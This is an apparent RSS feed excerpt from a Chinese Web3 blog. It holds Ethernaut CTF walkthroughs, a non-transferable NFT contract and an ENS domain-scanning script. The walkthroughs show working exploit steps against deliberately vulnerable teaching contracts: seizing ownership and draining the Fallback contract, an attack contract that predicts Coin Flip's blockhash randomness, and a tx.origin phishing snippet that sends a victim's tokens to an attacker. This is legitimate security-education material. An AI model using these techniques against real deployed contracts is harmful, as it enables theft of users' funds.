class="built_in">tokens</span>[_to] += _value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如</p> <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title"></span>() payable &#123;</span><br><span class="line">  token.transfer(attackerAddress, 10000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Chain&lt;/strong&gt;: Goerli&lt;br&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: ●○○○○&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.c</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>实现无法交易转账的Token</title>
    <link href="https://chaosky.tech/2022/10/07/Non-Transferable-Token/"/>
    <id>https://chaosky.tech/2022/10/07/Non-Transferable-Token/</id>
    <published>2022-10-07T20:08:44.000Z</published>
    <updated>2022-10-07T20:08:44.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Xwal is ERC721, Ownable &#123;</span><br><span class="line">    error NonTransferableToken();</span><br><span class="line"></span><br><span class="line">    constructor() ERC721(&quot;xwal&quot;, &quot;xwalNFT&quot;) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _baseURI() internal pure override returns (string memory) &#123;</span><br><span class="line">        return &quot;https://arweave.net/E7rz7sKa1wWxKlMeFVrtZHgRjGMdDadDkT4QF2vDDkw/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeMint(address to, uint256 tokenId) public onlyOwner &#123;</span><br><span class="line">        _safeMint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _beforeTokenTransfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId</span><br><span class="line">    ) override internal virtual &#123;</span><br><span class="line">        if (from != address(0) &amp;&amp; to != address(0)) &#123;</span><br><span class="line">            revert NonTransferableToken();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖 _beforeTokenTransfer 方法即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="Solidity" scheme="https://chaosky.tech/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>3. Coin Flip</title>
    <link href="https://chaosky.tech/2022/07/11/3-Coin-Flip/"/>
    <id>https://chaosky.tech/2022/07/11/3-Coin-Flip/</id>
    <published>2022-07-11T19:32:21.000Z</published>
    <updated>2022-07-11T19:32:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Difficulty</strong>: 3&#x2F;10<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f">https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f</a></p><p>先看通关要求：</p><blockquote><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>合约代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本关使用 block number 作为随机数，计算 div，然后和 _guess 进行比较。</p><p>由此可知只要保证调用方和被调用方的block number 相同就可以计算出结果。</p><p>个人钱包调用不能保证block number相同，需要单独写一个合约调用CoinFlip合约即可。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>获取关卡合约实例地址：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instance</span><br></pre></td></tr></table></figure><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，新建文件 CoinFlip.sol：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/utils/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">interface ICoinFlip &#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">  constructor(address _levelInstance) &#123;</span><br><span class="line">      levelInstance = _levelInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function guess() public &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">    if (side == true) &#123;</span><br><span class="line">        ICoinFlip(levelInstance).flip(true);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ICoinFlip(levelInstance).flip(false);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译部署，在 constructor 填入关卡合约地址然后部署。</p><p>然后分别在10个区块中调用 guess 函数。</p><p>最后提交，本关完成。</p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.</p><p>想要获得密码学上的随机数,你可以使用 <a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a>, 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.</p><p>一些其它的选项包括使用比特币block headers (通过验证 <a href="http://btcrelay.org/">BTC Relay</a>), <a href="https://github.com/randao/randao">RANDAO</a>, 或是 <a href="http://www.oraclize.it/">Oraclize</a>).</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: 3&amp;#x2F;10&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>2. Fallout</title>
    <link href="https://chaosky.tech/2022/07/11/2-Fallout/"/>
    <id>https://chaosky.tech/2022/07/11/2-Fallout/</id>
    <published>2022-07-11T19:28:42.000Z</published>
    <updated>2022-07-11T19:28:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Difficulty</strong>: 2&#x2F;10<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5">https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5</a></p><p>先看通关要求：获取合约所有权</p><p>分析代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用函数：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure><p>此题背后的故事：</p><blockquote><p>Rubixi的故事在以太坊生态中非常知名。 这个公司把名字从 ‘Dynamic Pyramid’ 改成 ‘Rubixi’ 但是不知道怎么地，他们没有把合约的 constructor 方法也一起更名：<br>contract Rubixi {<br>  address private owner;<br>  function DynamicPyramid() { owner &#x3D; msg.sender; }<br>  function collectAllFees() { owner.transfer(this.balance) }<br>  …<br>这让攻击者可以调用旧合约的constructor 然后获得合约的控制权，然后再获得一些资产。是的，这些重大错误在智能合约的世界是有可能的。</p></blockquote><p>以前的合约使用和合约同名的函数作为constructor使用，所以才会有这一题。而经过语法改善，现在已经用constructor 关键字来定义。</p><p>最后提交，本关完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: 2&amp;#x2F;10&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>1. Fallback</title>
    <link href="https://chaosky.tech/2022/05/19/1-Fallback/"/>
    <id>https://chaosky.tech/2022/05/19/1-Fallback/</id>
    <published>2022-05-19T21:19:55.000Z</published>
    <updated>2022-05-19T21:19:55.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Difficulty</strong>: 1&#x2F;10<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008">https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008</a></p><p>先看通关要求：</p><blockquote><ol><li>you claim ownership of the contract</li><li>you reduce its balance to 0<blockquote></blockquote></li></ol></blockquote><p>再分析合约代码，要成为合约的owner，有两种方式：</p><p>第一种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">contributions[msg.sender] += msg.value;</span><br><span class="line">if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>现在合约的owner初始化写入 <code>contributions[msg.sender] = 1000 * (1 ether);</code>，也就是说需要传入大于 owner 的数量，但是 <code>contribute</code> 函数中已定义 <code>require(msg.value &lt; 0.001 ether);</code> 所以此方法行不通。</p><p>第二种</p><p>最下方有一段跟其他函数不一样的代码，前面没有 function关键字，而是以 <code>receive()</code> 开头。这里有一个知识点 <a href="https://docs.soliditylang.org/en/v0.8.1/contracts.html#fallback-function">fallback function</a>:</p><blockquote><p>The fallback function is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable.</p></blockquote><p>也就是说，如果我们调用一个合约时函数签名不一致，或者函数名称不正确，就会直接运行这个 <code>fallback function</code>。</p><p>分析这个合约里的 <code>fallback function</code> 的代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">  owner = msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要达成 <code>msg.value &gt; 0</code> 和 <code>contributions[msg.sender] &gt; 0</code> 两个条件，msg.sender 就会被设定成 owner。</p><p><code>msg.value</code> 可以在调用合约时控制。</p><p>而另外一个条件需要再分析下代码：<code>contributions</code> 是一个 <code>mapping</code>，需要写入数据才能调用，而在 <code>contribute</code> 函数中有写入数据能力，分析 <code>contribute</code> 函数可知，以<code>msg.value &lt; 0.001 ether</code> 调用 <code>contribute</code> 函数，可令 <code>contributions[msg.sender] &gt; 0</code>。打开 Console(F12)，输入:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.00001&quot;</span>)&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于1 ether&#x3D; 10^18^ wei，这里使用了预设的 <code>toWei</code>  函数将 <code>0.00001 ether</code> 转换成 <code>wei</code> 单位发送。</p><p>待交易确认后，再调用 <code>fallback</code>：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.00001&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure><p>此时 <code>owner</code> 已经转为 <code>msg.sender</code>。</p><p>再调用 <code>withdraw</code> 函数把balance 归零：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract.<span class="title function_">withdraw</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后提交，本关完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: 1&amp;#x2F;10&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>使用 web3.py 扫描 ENS 域名</title>
    <link href="https://chaosky.tech/2022/05/05/web3-ens-scanner/"/>
    <id>https://chaosky.tech/2022/05/05/web3-ens-scanner/</id>
    <published>2022-05-05T20:25:20.000Z</published>
    <updated>2022-05-05T20:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近 ENS 大火，数字域名成了抢手货，10k Club 已经被注册完了，接下来战场来到了 100K Club。</p><p>为了能够扫描到还有哪些 ENS 域名未注册，我们需要一个工具。</p><p>首选的工具肯定是 <a href="https://github.com/ethereum/web3.py">web3.py</a>，它是一个 Python 库，可以用来扫描 ENS 域名。</p><p>具体操作如下：</p><h3 id="安装-web3-py"><a href="#安装-web3-py" class="headerlink" title="安装 web3.py"></a>安装 web3.py</h3><p>打开帮助文档<a href="https://web3py.readthedocs.io/en/latest/quickstart.html">快速开始</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure><h3 id="注册-Infura"><a href="#注册-Infura" class="headerlink" title="注册 Infura"></a>注册 Infura</h3><p>由于我们需要访问 Ethereum 主网，所以需要配置 Web3 的 RPC 地址。前往 <a href="https://infura.io/">Infura</a> 注册自己的账户，然后在页面右上角复制地址。</p><h3 id="使用-Web3"><a href="#使用-Web3" class="headerlink" title="使用 Web3"></a>使用 Web3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> ens <span class="keyword">import</span> ENS</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://&lt;your-provider-url&gt;&#x27;</span>))</span><br><span class="line"><span class="comment"># w3 = Web3(Web3.WebsocketProvider(&#x27;wss://&lt;your-provider-url&gt;&#x27;))</span></span><br><span class="line">ens = ENS.fromWeb3(w3)</span><br><span class="line"></span><br><span class="line">owner = ens.owner(<span class="string">&#x27;xwaer.eth&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(owner)</span><br></pre></td></tr></table></figure><p>填写你的 Infura 地址，然后执行代码，查看结果。</p><p>这个时候会返回这个 ENS 的 owner 地址。</p><p>如果需要 ENS 的更多方法，可以查看 <a href="https://web3py.readthedocs.io/en/latest/ens.html">ENS API</a>。</p><h3 id="扫描-ENS-域名"><a href="#扫描-ENS-域名" class="headerlink" title="扫描 ENS 域名"></a>扫描 ENS 域名</h3><p>这里我以扫描100k 以内的质数为例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> ens <span class="keyword">import</span> ENS</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://&lt;your-provider-url&gt;&#x27;</span>))</span><br><span class="line"><span class="comment"># w3 = Web3(Web3.WebsocketProvider(&#x27;wss://&lt;your-provider-url&gt;&#x27;))</span></span><br><span class="line">ens = ENS.fromWeb3(w3)</span><br><span class="line"></span><br><span class="line">owner = ens.owner(<span class="string">&#x27;xwaer.eth&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(owner)</span><br><span class="line"></span><br><span class="line">origin_file = <span class="built_in">open</span>(<span class="string">&quot;primes-to-100k.txt&quot;</span>)</span><br><span class="line">unavailable_file = <span class="built_in">open</span>(<span class="string">&quot;unavailable.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line">available_file = <span class="built_in">open</span>(<span class="string">&quot;available.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line">line = origin_file.readline()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    line = line.strip()</span><br><span class="line">    owner = ens.owner(line + <span class="string">&#x27;.eth&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> owner == <span class="string">&#x27;0x0000000000000000000000000000000000000000&#x27;</span>:</span><br><span class="line">        available_file.write(line + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        unavailable_file.write(line + <span class="string">&#x27;\t&#x27;</span> + owner + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    os.sync()</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    line = origin_file.readline()</span><br></pre></td></tr></table></figure><p>判断是否注册可以判断 owner 是否为 <code>0x0000000000000000000000000000000000000000</code> 地址。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近 ENS 大火，数字域名成了抢手货，10k Club 已经被注册完了，接下来战场来到了 100K Club。&lt;/p&gt;
&lt;p&gt;为了能够扫描到还有哪些 ENS 域名未注册，我们需要一个工具。&lt;/p&gt;
&lt;p&gt;首选的工具肯定是 &lt;a href=&quot;https://github.c</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ENS" scheme="https://chaosky.tech/tags/ENS/"/>
    
  </entry>
  
  <entry>
    <title>0. Hello Ethernaut</title>
    <link href="https://chaosky.tech/2022/04/29/0-Hello-Ethernaut/"/>
    <id>https://chaosky.tech/2022/04/29/0-Hello-Ethernaut/</id>
    <published>2022-04-29T17:46:45.000Z</published>
    <updated>2022-04-29T17:46:45.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Difficulty</strong>: 0&#x2F;10<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966">https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966</a></p><p>本节主要就是一个新手教学，让人先了解游戏玩法及闯关模式，需要对 MetaMask、JavaScript、console等有基本了解。</p><p>打开 Developer Console (F12) ，输入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">player</span><br></pre></td></tr></table></figure><p>会打印当前钱包地址。</p><p>依步骤了解指令用法，按 Get new instance 开始闯关。MetaMask 会弹出交易请求，确认以部署关卡合约，关卡正式开始。</p><p>打开 Developer Console (F12) ，依次输入:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">info</span>()</span><br><span class="line">&lt; <span class="string">&quot;You will find what you need in info1().&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">info1</span>()</span><br><span class="line">&lt; <span class="string">&quot;Try info2(), but with &quot;</span>hello<span class="string">&quot; as a parameter.&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">info2</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&lt; <span class="string">&quot;The property infoNum holds the number of the next info method to call.&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">infoNum</span>()</span><br><span class="line">&lt; <span class="variable constant_">BN</span> &#123;<span class="attr">negative</span>: <span class="number">0</span>, <span 